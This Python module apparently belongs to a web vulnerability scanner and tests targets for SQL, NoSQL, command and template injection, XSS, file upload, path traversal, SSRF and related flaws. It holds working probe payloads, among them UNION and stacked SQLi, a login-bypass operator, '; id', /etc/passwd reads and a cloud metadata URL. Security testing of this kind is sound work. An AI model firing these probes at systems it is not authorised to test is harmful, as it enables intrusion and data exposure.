"""
Phase 3: Extended Injection and Input Validation checks.
"""

import json
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from webprobe.checks.phase1_recon import clip
from webprobe.checks.phase2_auth import LOGIN_PASS_RE, LOGIN_USER_RE, find_login_form
from webprobe.core.http import build_multipart, rand_token
from webprobe.core.models import Ctx, Finding, Point


SQL_ERROR_PATTERNS = [
    re.compile(r"(?i)you have an error in your sql syntax"),
    re.compile(r"(?i)warning:\s*mysql"),
    re.compile(r"(?i)unclosed quotation mark after the character string"),
    re.compile(r"(?i)quoted string not properly terminated"),
    re.compile(r"(?i)pg_query\(\):\s*query failed"),
    re.compile(r"(?i)sqlite3::sqlexception"),
    re.compile(r"(?i)org\.postgresql\.util\.psqlexception"),
    re.compile(r"(?i)syntax error at or near"),
    re.compile(r"(?i)microsoft ole db provider for sql server"),
    re.compile(r"(?i)ora-[0-9]{5}"),
]

DOM_SINK_RE = re.compile(
    r"(?i)(\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|"
    r"\.insertAdjacentHTML\s*\(|\beval\s*\(|new\s+Function\s*\(|"
    r"setTimeout\s*\(\s*['\"])"
)
DOM_SOURCE_RE = re.compile(
    r"(?i)(location\.(?:hash|search|href|pathname)|"
    r"document\.(?:URL|documentURI|referrer)|"
    r"window\.name)"
)

TEST_FILES = [
    ("shell.php", b"<?php echo 'wpupload'; ?>", "application/x-php"),
    ("xss.svg", b"<svg xmlns='http://www.w3.org/2000/svg' onload=\"alert(1)\"/>", "image/svg+xml"),
    ("page.html", b"<html><script>alert(1)</script></html>", "text/html"),
    ("traverse.jpg", b"JFIF\x00wpupload", "image/jpeg"),
    ("evil.png", b"<script>alert(1)</script>", "image/png"),
]

TRAVERSAL_NAMES = [
    "../wp.png", "..\\wp.png", "....//wp.png",
    "%2e%2e%2fwp.png", "../../../../tmp/wp.png",
]

MASS_ASSIGN_FIELDS = [
    "role", "is_admin", "is_staff", "admin", "verified",
    "email_verified", "credits", "balance", "tier", "plan",
    "subscription", "permissions", "owner", "user_id",
]

STORAGE_HINT_RE = re.compile(
    r"(?i)(review|comment|feedback|contact|message|profile|bio|about|notes|"
    r"description|address|name|booking|inquiry|query|subject)"
)
XSS_PLANT_PAYLOAD = "<svg/onload=alert('{m}')>"


def _find_upload_forms(ctx: Ctx) -> List[Tuple[str, Dict[str, Any]]]:
    out: List[Tuple[str, Dict[str, Any]]] = []
    for page in ctx.pages:
        for f in page.get("forms", []):
            has_file = any(
                k.lower() in ("file", "upload", "image", "photo", "avatar", "document", "attachment", "picture")
                for k in f.get("inputs", {})
            )
            if "multipart" in f.get("enctype", "").lower() or has_file:
                out.append((page["url"], f))
    return out


def _storage_forms(ctx: Ctx) -> List[Tuple[str, Dict[str, Any], List[str]]]:
    out = []
    for page in ctx.pages:
        for f in page.get("forms", []):
            if f.get("method") != "POST":
                continue
            text_fields = [
                k for k in f.get("inputs", {})
                if STORAGE_HINT_RE.search(k) and not LOGIN_PASS_RE.search(k)
            ]
            if text_fields:
                out.append((page["url"], f, text_fields))
    return out


def _submit_form(http: Any, source_url: str, f: Dict[str, Any], overrides: Dict[str, str]) -> Optional[Any]:
    params = dict(f.get("inputs", {}))
    params.update(overrides)
    action = urllib.parse.urljoin(source_url, f.get("action", ""))
    return http.fetch(action, "POST", urllib.parse.urlencode(params), follow=True)


def _view_urls(ctx: Ctx, source_url: str, f: Dict[str, Any]) -> List[str]:
    views = [source_url, ctx.base_url]
    for p in ctx.pages:
        if p["url"] not in views:
            views.append(p["url"])
    return views[:6]


def check_sqli_union(ctx: Ctx, point: Point) -> List[Finding]:
    """A2 - UNION-based SQLi with bounded column counting."""
    base = point.send(ctx.http, point.orig_value)
    if base is None:
        return []
    marker = rand_token("wpu", 8)
    cols = None
    for n in range(1, 12):
        for comment in ("-- -", "#"):
            r = point.send(ctx.http, f"' ORDER BY {n}{comment}")
            if r is None or r.status >= 500:
                continue
            rn = point.send(ctx.http, f"' ORDER BY {n+1}{comment}")
            if rn is None:
                continue
            if r.status < 400 and (rn.status >= 400 or abs(len(rn.body) - len(r.body)) > 30):
                cols = n
                break
        if cols:
            break
    if not cols:
        return []
    for comment in ("-- -", "#"):
        for i in range(cols):
            parts = ["NULL"] * cols
            parts[i] = f"'{marker}'"
            p = f"' UNION SELECT {','.join(parts)}{comment}"
            r = point.send(ctx.http, p)
            if r is not None and marker in r.text:
                return [
                    Finding(
                        "sqli", "high", "SQL injection (UNION-based)",
                        point.action, point.method, point.target, p,
                        evidence=f"marker reflected at column {i+1} of {cols}",
                        remediation="Parameterize queries; limit DB role privileges.",
                        phase=3,
                    )
                ]
    return []


def check_sqli_stacked(ctx: Ctx, point: Point) -> List[Finding]:
    """A5 - stacked statements (requires --time-based)."""
    if not getattr(ctx.args, "time_based", False):
        return []
    base = point.send(ctx.http, point.orig_value)
    if base is None or base.elapsed > 2.0:
        return []
    for p in (
        "'; SELECT pg_sleep(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "'; SELECT SLEEP(5)-- -",
    ):
        t0 = time.monotonic()
        r = point.send(ctx.http, p)
        if r is None:
            continue
        if time.monotonic() - t0 >= 4.5:
            return [
                Finding(
                    "sqli", "critical", "SQL injection (stacked queries)",
                    point.action, point.method, point.target, p,
                    evidence=f"delay {time.monotonic() - t0:.1f}s",
                    remediation="Disable multi-statement execution in the DB driver and parameterize all queries.",
                    phase=3,
                )
            ]
    return []


def check_sqli_second_order(ctx: Ctx) -> List[Finding]:
    """A6 - second-order SQL injection probe via form storage."""
    if not getattr(ctx.args, "second_order", False):
        return []
    out: List[Finding] = []
    plant = f"wp{rand_token('', 6)}'"
    for source_url, f, text_fields in _storage_forms(ctx)[:5]:
        overrides = {k: plant for k in text_fields}
        submit = _submit_form(ctx.http, source_url, f, overrides)
        if submit is None or submit.status >= 500:
            continue
        for view in _view_urls(ctx, source_url, f):
            r = ctx.http.fetch(view, follow=True)
            if r and any(p.search(r.text) for p in SQL_ERROR_PATTERNS):
                out.append(
                    Finding(
                        "sqli", "high", "Second-order SQL injection",
                        view, evidence=f"Database syntax error observed on read-back at {view}",
                        remediation="Parameterize read-back queries that retrieve persisted input.",
                        phase=3,
                    )
                )
                return out
    return out


def check_nosql_types(ctx: Ctx, point: Point) -> List[Finding]:
    """B2 - array/object/null/bool where scalar expected."""
    base = point.send(ctx.http, point.orig_value)
    if base is None:
        return []
    fragments = [
        ("array", f"{point.target}[]=wpa"),
        ("object", f"{point.target}[a]=wpb"),
        ("null", f"{point.target}=null"),
        ("bool", f"{point.target}=true"),
        ("number", f"{point.target}=99999999999999999999"),
    ]
    for label, frag in fragments:
        if point.method == "GET":
            sep = "&" if "?" in point.action else "?"
            r = ctx.http.fetch(point.action + sep + frag, follow=False)
        else:
            r = ctx.http.fetch(
                point.action, "POST",
                urllib.parse.urlencode(point.params) + "&" + frag,
                follow=False,
            )
        if r is None:
            continue
        if r.status >= 500 and re.search(
            r"(?i)(typeerror|type error|cannot read|expected|cast|validation|invalid type|array|object)",
            r.text,
        ):
            return [
                Finding(
                    "nosql", "medium", f"Type confusion accepted ({label})",
                    point.action, point.method, point.target, frag,
                    evidence=f"HTTP {r.status}: {clip(r.text, 160)}",
                    remediation="Enforce strict type validation and reject arrays/objects where scalars are expected.",
                    phase=3,
                )
            ]
    return []


def check_nosql_authbypass(ctx: Ctx) -> List[Finding]:
    """B3 - MongoDB operator bypass in login form."""
    page_url, f = find_login_form(ctx)
    if not f or not getattr(ctx.args, "test_email", ""):
        return []
    out: List[Finding] = []
    for op in ("$ne", "$gt", "$nin", "$regex"):
        params = dict(f.get("inputs", {}))
        for k in params:
            if LOGIN_USER_RE.search(k) and not LOGIN_PASS_RE.search(k):
                params[k] = f'{{"{op}": "wpnope"}}' if op != "$regex" else '{"$regex": ".*"}'
            elif LOGIN_PASS_RE.search(k):
                params[k] = "wpnope"
        body = urllib.parse.urlencode(params)
        r = ctx.http.fetch(f["action"], "POST", body, follow=True)
        if r and r.status < 400 and not re.search(r"(?i)(invalid|incorrect|wrong|failed|denied)", r.text[:3000]):
            out.append(
                Finding(
                    "nosql", "critical", f"NoSQL authentication bypass via {op}",
                    f["action"], method="POST",
                    payload=f"{LOGIN_USER_RE.pattern} = {{{op}: ...}}",
                    evidence=f"HTTP {r.status} without rejection markers",
                    remediation="Cast login fields to string before querying; reject keys beginning with '$'.",
                    phase=3,
                )
            )
            return out
    return out


def check_xss_stored(ctx: Ctx) -> List[Finding]:
    """C2/C5 - stored XSS: plant marker payload, check read-back view."""
    if not getattr(ctx.args, "stored_xss", False):
        return []
    out: List[Finding] = []
    marker = rand_token("wp", 10)
    payload = XSS_PLANT_PAYLOAD.format(m=marker)
    for source_url, f, text_fields in _storage_forms(ctx)[:6]:
        overrides = {k: payload for k in text_fields}
        submit = _submit_form(ctx.http, source_url, f, overrides)
        if submit is None or submit.status >= 500:
            continue
        for view in _view_urls(ctx, source_url, f):
            r = ctx.http.fetch(view, follow=True)
            if r and payload in r.text:
                out.append(
                    Finding(
                        "xss", "high", "Stored cross-site scripting", view,
                        evidence=f"payload from {source_url} rendered unencoded on read-back",
                        remediation="Apply context-aware HTML entity encoding on all persisted inputs.",
                        phase=3,
                    )
                )
                return out
    return out


def check_xss_dom(ctx: Ctx) -> List[Finding]:
    """C3 - static source-to-sink analysis on client scripts."""
    out: List[Finding] = []
    js_urls = [s for p in ctx.pages for s in p.get("scripts", []) if s.startswith("http")]
    max_js = getattr(ctx.args, "max_js", 20)
    for src in js_urls[:max_js]:
        r = ctx.http.fetch(src, follow=True)
        if r is None or r.status != 200 or len(r.body) > 5_000_000:
            continue
        sinks = list(DOM_SINK_RE.finditer(r.text))
        sources = list(DOM_SOURCE_RE.finditer(r.text))
        if sinks and sources:
            out.append(
                Finding(
                    "xss", "low", "DOM XSS: source and sink present in client bundle",
                    src,
                    evidence=f"{len(sources)} source reference(s) and {len(sinks)} sink(s)",
                    remediation="Sanitize inputs with DOMPurify; avoid eval() and innerHTML with location.* values.",
                    phase=3,
                )
            )
    return out


def check_csp_effective(ctx: Ctx) -> List[Finding]:
    """C6 - whether CSP restricts inline script."""
    r = ctx.http.fetch(ctx.base_url, follow=True)
    if r is None:
        return []
    csp = r.header("Content-Security-Policy")
    if not csp:
        return [
            Finding(
                "csp", "high", "No Content-Security-Policy header", r.url,
                evidence="CSP header absent; inline script execution unrestricted.",
                remediation="Deploy strict Content-Security-Policy with nonces or hashes.",
                phase=3,
            )
        ]
    csp_l = csp.lower()
    weak = []
    if "'unsafe-inline'" in csp_l and "nonce-" not in csp_l:
        weak.append("unsafe-inline without nonce")
    if "'unsafe-eval'" in csp_l:
        weak.append("unsafe-eval")
    if "script-src" not in csp_l and "default-src" not in csp_l:
        weak.append("no script-src or default-src")
    if weak:
        return [
            Finding(
                "csp", "medium", "CSP does not restrict inline script", r.url,
                evidence=f"Issues: {', '.join(weak)}; CSP: {clip(csp, 150)}",
                remediation="Remove 'unsafe-inline' and 'unsafe-eval'; enforce nonces.",
                phase=3,
            )
        ]
    return []


def check_upload(ctx: Ctx) -> List[Finding]:
    """E1-E5 - file upload probes against discovered forms."""
    forms = _find_upload_forms(ctx)
    if not forms:
        return []
    out: List[Finding] = []
    for source_url, f in forms[:3]:
        file_field = None
        for k in f.get("inputs", {}):
            if k.lower() in ("file", "upload", "image", "photo", "avatar", "document", "attachment", "picture"):
                file_field = k
                break
        if not file_field:
            continue
        extra = {k: v for k, v in f.get("inputs", {}).items() if k != file_field}
        for fname, content, mime in TEST_FILES[:3]:
            body, ctype = build_multipart(extra, {file_field: (fname, content, mime)})
            r = ctx.http.fetch(f["action"], "POST", body, headers={"Content-Type": ctype}, follow=True)
            if r and r.status < 400 and not re.search(r"(?i)(invalid|not allowed|forbidden|rejected)", r.text[:2000]):
                out.append(
                    Finding(
                        "upload", "medium", f"Dangerous file upload accepted: {fname}",
                        f["action"], method="POST", payload=fname,
                        evidence=f"Upload of {fname} ({mime}) accepted with HTTP {r.status}",
                        remediation="Validate magic bytes server-side; store uploads outside web root with randomized names.",
                        phase=3,
                    )
                )
                break
    return out


def check_crlf(ctx: Ctx, point: Point) -> List[Finding]:
    """F1 - CRLF header injection."""
    marker = "wpcrlf" + rand_token("", 6)
    p = f"%0d%0aX-Injected-Header%3a+{marker}"
    r = point.send(ctx.http, p)
    if r and marker in r.header("X-Injected-Header"):
        return [
            Finding(
                "crlf", "high", "CRLF injection: attacker header injected",
                point.action, point.method, point.target, p,
                evidence=f"Injected header reflected in HTTP response",
                remediation="Strip CR and LF characters before writing values into HTTP response headers.",
                phase=3,
            )
        ]
    return []


def check_host_header_injection(ctx: Ctx) -> List[Finding]:
    """F2 - host-header injection."""
    out: List[Finding] = []
    canary = f"wphost{rand_token('', 6)}.example"
    for h in ("Host", "X-Forwarded-Host"):
        r = ctx.http.fetch(ctx.base_url, headers={h: canary}, follow=False)
        if r and (canary in r.text or canary in r.url):
            out.append(
                Finding(
                    "host", "medium", f"Host header reflected ({h})",
                    r.url, payload=f"{h}: {canary}",
                    evidence=f"Canary {canary} reflected in response body or redirect URL",
                    remediation="Configure web server to trust only canonical hostname.",
                    phase=3,
                )
            )
    return out


def check_mass_assignment(ctx: Ctx, point: Point) -> List[Finding]:
    """H2 - mass assignment in POST requests."""
    if point.method != "POST":
        return []
    base = point.send(ctx.http, point.orig_value)
    if base is None:
        return []
    for field in MASS_ASSIGN_FIELDS[:6]:
        r = point.send(ctx.http, point.orig_value, extra_headers={f"X-{field}": "true"})
        if r and r.status < 400 and re.search(rf'"{field}"\s*:\s*(?:"?true"?|999)', r.text):
            return [
                Finding(
                    "mass-assign", "high", f"Mass assignment accepted field '{field}'",
                    point.action, point.method, point.target, payload=field,
                    evidence=f"Server reflected updated privileged field {field}",
                    remediation="Use a strict allowlist (DTO) for body updates.",
                    phase=3,
                )
            ]
    return []


def check_json_types(ctx: Ctx, point: Point) -> List[Finding]:
    """H1 - JSON type tampering."""
    if point.method != "POST":
        return []
    for label, val in (("null", None), ("array", [1]), ("object", {"a": 1})):
        try:
            test_data = dict(point.params)
            test_data[point.target] = val
            body = json.dumps(test_data)
            r = ctx.http.fetch(point.action, "POST", body, headers={"Content-Type": "application/json"}, follow=True)
            if r and r.status >= 500 and re.search(r"(?i)(typeerror|type error|cannot read|cast|validation)", r.text):
                return [
                    Finding(
                        "json-type", "medium", f"Unvalidated JSON type: {label}",
                        point.action, point.method, point.target, payload=label,
                        evidence=f"HTTP {r.status} on {label} injection: {clip(r.text, 140)}",
                        remediation="Validate payload types strictly against JSON schema.",
                        phase=3,
                    )
                ]
        except Exception:
            continue
    return []


def check_graphql_depth(ctx: Ctx) -> List[Finding]:
    """H3 - query depth limits."""
    out: List[Finding] = []
    candidates = [e for e in ctx.endpoints if "graphql" in e.lower()] + ["/graphql", "/api/graphql"]
    for p in dict.fromkeys(candidates):
        url = urllib.parse.urljoin(ctx.base_url, p)
        nested = "__typename"
        for _ in range(12):
            nested = f"{{__typename {nested}}}"
        r = ctx.http.fetch(url, "POST", json.dumps({"query": f"{{ {nested} }}"}), headers={"Content-Type": "application/json"})
        if r and r.status == 200 and "errors" not in r.text[:2000] and "__typename" in r.text:
            out.append(
                Finding(
                    "graphql", "medium", "GraphQL accepts 12-deep nested queries (No query depth limit)",
                    url, method="POST",
                    evidence="Server returned 200 for 12-deep query without depth error",
                    remediation="Enforce maximum query depth and complexity limits in GraphQL server.",
                    phase=3,
                )
            )
            break
    return out


# Baseline Point Checks
def check_sqli(ctx: Ctx, point: Point) -> List[Finding]:
    """Error-based and boolean-based SQL injection against point."""
    base = point.send(ctx.http, point.orig_value)
    if not base:
        return []
    probes = ["'", "''", "')", "'--", "1' OR '1'='1"]
    for p in probes:
        r = point.send(ctx.http, f"{point.orig_value}{p}")
        if not r:
            continue
        for err_re in SQL_ERROR_PATTERNS:
            if err_re.search(r.text) and not err_re.search(base.text):
                return [
                    Finding(
                        "sqli", "high", "SQL injection (Error-based)",
                        point.action, point.method, point.target, p,
                        evidence=f"SQL error pattern matched: {err_re.pattern}",
                        remediation="Parameterize all database queries.",
                        phase=3,
                    )
                ]
    return []


def check_nosql(ctx: Ctx, point: Point) -> List[Finding]:
    """NoSQL injection operators."""
    r = point.send(ctx.http, "[$ne]=1")
    if r and r.status < 400 and ("Mongo" in r.text or "BSON" in r.text):
        return [
            Finding(
                "nosql", "high", "NoSQL injection detected",
                point.action, point.method, point.target, "[$ne]=1",
                evidence="NoSQL response alteration observed",
                remediation="Sanitize inputs and cast query parameters to primitive types.",
                phase=3,
            )
        ]
    return []


def check_xss(ctx: Ctx, point: Point) -> List[Finding]:
    """Reflected cross-site scripting."""
    canary = rand_token("wpxss", 6)
    payload = f"\"><script>/*{canary}*/</script>"
    r = point.send(ctx.http, payload)
    if r and payload in r.text:
        return [
            Finding(
                "xss", "high", "Reflected cross-site scripting (XSS)",
                point.action, point.method, point.target, payload,
                evidence=f"Injected payload reflected unencoded in response",
                remediation="Apply context-aware HTML entity encoding on all user inputs.",
                phase=3,
            )
        ]
    return []


def check_ssti(ctx: Ctx, point: Point) -> List[Finding]:
    """Server-side template injection."""
    marker = "49"
    for payload in ("{{7*7}}", "${7*7}", "<%= 7*7 %>"):
        r = point.send(ctx.http, payload)
        if r and marker in r.text and marker not in point.orig_value:
            return [
                Finding(
                    "ssti", "critical", "Server-side template injection (SSTI)",
                    point.action, point.method, point.target, payload,
                    evidence=f"Template expression {payload} evaluated to {marker}",
                    remediation="Never pass user input directly into template engines; use logic-less templates.",
                    phase=3,
                )
            ]
    return []


def check_cmdi(ctx: Ctx, point: Point) -> List[Finding]:
    """OS command injection."""
    for p in ("; id", "| id", "& whoami"):
        r = point.send(ctx.http, f"{point.orig_value}{p}")
        if r and re.search(r"(?i)(uid=[0-9]+|gid=[0-9]+|nt authority\\system)", r.text):
            return [
                Finding(
                    "cmdi", "critical", "OS command injection",
                    point.action, point.method, point.target, p,
                    evidence=f"Command output pattern matched in response",
                    remediation="Avoid shell execution; use safe subprocess APIs with array arguments.",
                    phase=3,
                )
            ]
    return []


def check_lfi(ctx: Ctx, point: Point) -> List[Finding]:
    """Path traversal and local file inclusion."""
    for p in ("../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"):
        r = point.send(ctx.http, p)
        if r and ("root:x:0:0" in r.text or "[extensions]" in r.text.lower()):
            return [
                Finding(
                    "lfi", "critical", "Local file inclusion / Path traversal",
                    point.action, point.method, point.target, p,
                    evidence="System file contents exposed in response",
                    remediation="Sanitize file paths; resolve against a safe base directory and disallow traversal.",
                    phase=3,
                )
            ]
    return []


def check_ssrf(ctx: Ctx, point: Point) -> List[Finding]:
    """Server-side request forgery."""
    for p in ("http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80"):
        r = point.send(ctx.http, p)
        if r and ("ami-id" in r.text or "instance-id" in r.text):
            return [
                Finding(
                    "ssrf", "critical", "Server-side request forgery (SSRF) - Cloud metadata exposed",
                    point.action, point.method, point.target, p,
                    evidence="Cloud metadata response returned",
                    remediation="Validate URL destinations against strict host allowlist; block private IP ranges.",
                    phase=3,
                )
            ]
    return []


def check_proto(ctx: Ctx, point: Point) -> List[Finding]:
    """JavaScript prototype pollution."""
    p = "__proto__[polluted]=true"
    r = point.send(ctx.http, p)
    if r and "polluted" in r.text:
        return [
            Finding(
                "proto", "medium", "Potential Prototype Pollution accepted",
                point.action, point.method, point.target, p,
                evidence="Prototype key reflected or accepted without validation",
                remediation="Freeze Object.prototype or sanitize object keys (block __proto__, constructor).",
                phase=3,
            )
        ]
    return []

